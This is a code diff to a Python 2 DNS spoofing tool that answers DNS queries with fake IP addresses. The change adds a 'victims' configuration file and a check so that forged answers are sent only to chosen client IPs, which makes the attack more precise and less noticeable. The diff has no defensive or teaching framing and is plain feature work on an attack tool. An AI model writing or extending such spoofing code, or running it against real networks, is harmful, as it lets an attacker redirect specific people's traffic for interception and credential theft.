@@ -40,16 +40,18 @@ dominios = {}
 nospoof = []
 specificspoof = {}
 nospoofto = []
+victims = []
 
 LOGREQFILE = "dnslog.txt"
 LOGSNIFFFILE = "snifflog.txt"
 LOGALERTFILE = "dnsalert.txt"
 RESOLVCONF = "resolv.conf"
 
-nospoof_file = "nospoof.cfg"
+victim_file    = "victims.cfg"
+nospoof_file   = "nospoof.cfg"
 nospoofto_file = "nospoofto.cfg"
-specific_file = "spoof.cfg"
-dominios_file = "dominios.cfg"
+specific_file  = "spoof.cfg"
+dominios_file  = "dominios.cfg"
 
 if len(sys.argv) >2:
     ip = sys.argv[2]
@@ -95,6 +97,9 @@ def process_files():
 	for i in nospoofto[:]:
 		nospoofto.remove(i)
 
+	for i in victims[:]:
+		victims.remove(i)
+
 	dominios.clear()
 	specificspoof.clear()
 
@@ -106,6 +111,16 @@ def process_files():
 			nospoof.append(h[0])
 
 	nsfile.close()
+
+	nsfile = open(victim_file,'r')
+	for line in nsfile:
+		h = line.split()
+		if len(h)>0:
+			print 'Spoofing only to '+h[0]
+			victims.append(h[0])
+
+	nsfile.close()
+
 
 	nsfile = open(nospoofto_file,'r')
 	for line in nsfile:
@@ -468,7 +483,7 @@ def std_A_qry(msg,prov_ip):
 
 
         ttl = 1
-        if (host not in nospoof) & (prov_ip not in nospoofto):
+        if (host not in nospoof) and (prov_ip not in nospoofto) and (len(victims)==0 or prov_ip in victims):
                 if specificspoof.has_key(host):
                     save_req(LOGREQFILE,'!!! Specific host ('+host+') asked....\n')
                     print 'Adding fake IP = '+ specificspoof[host]
